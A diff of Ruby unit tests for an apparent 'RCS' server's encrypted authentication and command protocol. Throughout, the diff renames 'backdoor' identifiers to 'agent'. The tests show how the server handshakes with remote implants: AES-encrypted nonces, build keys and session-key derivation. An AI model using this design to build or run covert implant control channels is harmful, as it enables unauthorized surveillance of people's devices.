@@ -60,7 +60,7 @@ class TestProtocol < Test::Unit::TestCase
   include RCS::Crypt
 
   def setup
-    DB.instance.instance_variable_set(:@backdoor_signature, Digest::MD5.digest('test-signature'))
+    DB.instance.instance_variable_set(:@agent_signature, Digest::MD5.digest('test-signature'))
     DB.instance.instance_variable_set(:@factory_keys, {"RCS_BUILD-TEST" => 'test-class-key'})
   end
 
@@ -76,7 +76,7 @@ class TestProtocol < Test::Unit::TestCase
 
     # fake message inside the crypt
     message = "test fake message to fuzzy the protocol".ljust(104, "\x00")
-    message = aes_encrypt(message, DB.instance.backdoor_signature)
+    message = aes_encrypt(message, DB.instance.agent_signature)
     content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
     assert_nil content
   end
@@ -90,7 +90,7 @@ class TestProtocol < Test::Unit::TestCase
     type = "TEST".ljust(16, "\x00")
     sha = Digest::SHA1.digest(build + instance + type + DB.instance.factory_key_of('RCS_BUILD-TEST'))
     message = kd + nonce + build + instance + type + sha
-    message = aes_encrypt(message, DB.instance.backdoor_signature)
+    message = aes_encrypt(message, DB.instance.agent_signature)
 
     content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
 
@@ -99,7 +99,7 @@ class TestProtocol < Test::Unit::TestCase
 
     # [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]
     assert_equal 64, content.length
-    ks = aes_decrypt(content.slice!(0..31), DB.instance.backdoor_signature)
+    ks = aes_decrypt(content.slice!(0..31), DB.instance.agent_signature)
     # calculate the session key ->  K = sha1(Cb || Ks || Kd)
     # we use a schema like PBKDF1
     k = Digest::SHA1.digest(DB.instance.factory_key_of('RCS_BUILD-TEST') + ks + kd)
@@ -119,7 +119,7 @@ class TestProtocol < Test::Unit::TestCase
     # prepare the command
     message = [Commands::PROTO_ID].pack('I')
     message += [2011010101].pack('I')
-    message += "backdoor.userid".pascalize + "backdoor.deviceid".pascalize + "backdoor.sourceid".pascalize
+    message += "agent.userid".pascalize + "agent.deviceid".pascalize + "agent.sourceid".pascalize
     enc = aes_encrypt_integrity(message, key)
 
     content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
